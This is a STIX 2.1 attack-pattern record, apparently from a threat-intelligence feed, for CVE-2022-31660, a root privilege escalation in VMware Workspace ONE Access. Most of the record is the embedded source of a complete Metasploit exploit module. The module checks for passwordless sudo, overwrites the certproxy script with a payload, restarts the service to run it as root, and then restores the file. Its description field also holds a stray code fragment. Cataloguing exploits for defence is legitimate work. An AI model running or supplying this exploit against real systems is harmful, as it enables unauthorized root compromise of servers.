{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--243e521b-4399-49dc-8ee3-7e84978876da",
    "created": "2024-08-14T16:58:39.690063Z",
    "modified": "2024-08-14T16:58:39.690068Z",
    "name": "VMware Workspace ONE Access CVE-2022-31660",
    "description": " VMware Workspace ONE Access contains a vulnerability whereby the horizon user can escalate their privileges to those of the root user by modifying a file and then restarting the vmware-certproxy service which invokes it. The service control is permitted via the sudo configuration without a password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vmware_workspace_one_access_certproxy_lpe.rb",
            "external_id": "vmware_workspace_one_access_certproxy_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-31660"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2022-0021.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  TARGET_FILE = '/opt/vmware/certproxy/bin/cert-proxy.sh'.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VMware Workspace ONE Access CVE-2022-31660',\n          'Description' => %q{\n            VMware Workspace ONE Access contains a vulnerability whereby the horizon user can escalate their privileges\n            to those of the root user by modifying a file and then restarting the vmware-certproxy service which\n            invokes it. The service control is permitted via the sudo configuration without a password.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Spencer McIntyre'\n          ],\n          'Platform' => [ 'linux', 'unix' ],\n          'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n          'SessionTypes' => ['shell', 'meterpreter'],\n          'Targets' => [\n            [ 'Automatic', {} ],\n          ],\n          'DefaultOptions' => {\n            'PrependFork' => true,\n            'MeterpreterTryToFork' => true\n          },\n          'Privileged' => true,\n          'DefaultTarget' => 0,\n          'References' => [\n            [ 'CVE', '2022-31660' ],\n            [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0021.html' ]\n          ],\n          'DisclosureDate' => '2022-08-02',\n          'Notes' => {\n            # We're corrupting the vmware-certproxy service, if restoring the contents fails it won't work. This service\n            # is disabled by default though.\n            'Stability' => [CRASH_SERVICE_DOWN],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => [ARTIFACTS_ON_DISK]\n          }\n        }\n      )\n    )\n  end\n\n  def certproxy_service\n    # this script's location depends on the version, so find it.\n    return @certproxy_service if @certproxy_service\n\n    @certproxy_service = [\n      '/usr/local/horizon/scripts/certproxyService.sh',\n      '/opt/vmware/certproxy/bin/certproxyService.sh'\n    ].find { |path| file?(path) }\n\n    vprint_status(\"Found service control script at: #{@certproxy_service}\") if @certproxy_service\n    @certproxy_service\n  end\n\n  def sudo(arguments)\n    cmd_exec(\"sudo --non-interactive #{arguments}\")\n  end\n\n  def check\n    unless whoami == 'horizon'\n      return CheckCode::Safe('Not running as the horizon user.')\n    end\n\n    token = Rex::Text.rand_text_alpha(10)\n    unless sudo(\"--list '#{certproxy_service}' && echo #{token}\").include?(token)\n      return CheckCode::Safe('Cannot invoke the service control script with sudo.')\n    end\n\n    unless writable?(TARGET_FILE)\n      return CheckCode::Safe('Cannot write to the service file.')\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    # backup the original permissions and contents\n    print_status('Backing up the original file...')\n    @backup = {\n      stat: stat(TARGET_FILE),\n      contents: read_file(TARGET_FILE)\n    }\n\n    if payload.arch.first == ARCH_CMD\n      payload_data = \"#!/bin/bash\\n#{payload.encoded}\"\n    else\n      payload_data = generate_payload_exe\n    end\n    upload_and_chmodx(TARGET_FILE, payload_data)\n    print_status('Triggering the payload...')\n    sudo(\"--background #{certproxy_service} restart\")\n  end\n\n  def cleanup\n    return unless @backup\n\n    print_status('Restoring file contents...')\n    file_rm(TARGET_FILE) # it's necessary to delete the running file before overwriting it\n    write_file(TARGET_FILE, @backup[:contents])\n    print_status('Restoring file permissions...')\n    chmod(TARGET_FILE, @backup[:stat].mode & 0o777)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-08-02",
    "x_mitre_platforms": [
        "[ 'linux', 'unix' ]"
    ]
}